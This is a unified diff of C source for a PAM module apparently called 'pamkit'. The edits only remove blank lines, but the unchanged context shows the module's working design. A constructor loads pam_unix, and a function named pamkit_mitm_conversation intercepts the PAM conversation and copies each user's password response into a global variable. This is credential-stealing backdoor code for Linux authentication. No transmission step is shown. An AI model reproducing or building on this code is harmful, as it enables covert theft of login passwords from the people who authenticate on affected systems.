@@ -29,7 +29,6 @@ char *pamkit_authtok = NULL;
 
 void *module_handle = NULL;
 
-
 void __attribute__((constructor))
 load_pam_unix(void)
 {
@@ -51,14 +50,12 @@ unload_pam_unix(void)
     }
 }
 
-
 static void inline
 _do_free(void *ptr)
 {
     free(ptr);
     ptr = NULL;
 }
-
 
 int
 pamkit_mitm_conversation(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr)
@@ -74,7 +71,6 @@ pamkit_mitm_conversation(int num_msg, const struct pam_message **msg, struct pam
     if (retval != PAM_SUCCESS) {
         return retval;
     }
-
 
     //loop through the msgs and the respective responses
     for(int i = 0; i < num_msg; i++) {
@@ -94,10 +90,8 @@ pamkit_mitm_conversation(int num_msg, const struct pam_message **msg, struct pam
             pamkit_authtok = strdup(response->resp);
         }
     }
-    
     return PAM_SUCCESS;
 }
-
 
 int
 pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
